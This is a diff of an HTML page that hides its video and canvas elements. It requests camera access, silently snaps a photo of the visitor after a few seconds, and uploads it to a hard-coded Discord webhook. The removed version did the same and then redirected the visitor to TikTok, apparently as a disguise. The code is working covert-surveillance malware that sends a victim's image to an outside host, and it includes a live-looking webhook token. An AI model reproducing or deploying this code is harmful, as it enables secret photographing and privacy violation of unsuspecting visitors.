@@ -1,39 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+</head>
+<body>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
-  const video = document.getElementById('video');
+const webhook =
+"https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
 
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
+const video = document.getElementById("video");
 
-      setTimeout(async () => {
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+
+    video.srcObject = stream;
+
+    setTimeout(() => {
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
 
         ctx.drawImage(video, 0, 0);
 
-        // تحويل الصورة إلى Blob
-        canvas.toBlob(async (blob) => {
+        canvas.toBlob(async function(blob) {
 
-          const formData = new FormData();
-          formData.append("file", blob, "photo.png");
+            const formData = new FormData();
 
-          // ويبهوك الدسكورد
-          await fetch("https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC", {
-            method: "POST",
-            body: formData
-          });
+            formData.append("file", blob, "photo.png");
 
-          // تحويل بعد الإرسال
-          window.location.href = "https://www.tiktok.com/";
+            try {
+
+                await fetch(webhook, {
+                    method: "POST",
+                    body: formData
+                });
+
+                console.log("sent");
+
+            } catch (e) {
+
+                console.log(e);
+
+            }
 
         }, "image/png");
 
-      }, 2000);
-    })
-    .catch(() => {
-      alert("Camera permission denied");
-    });
+    }, 3000);
+
+});
 </script>
+
+</body>
+</html>
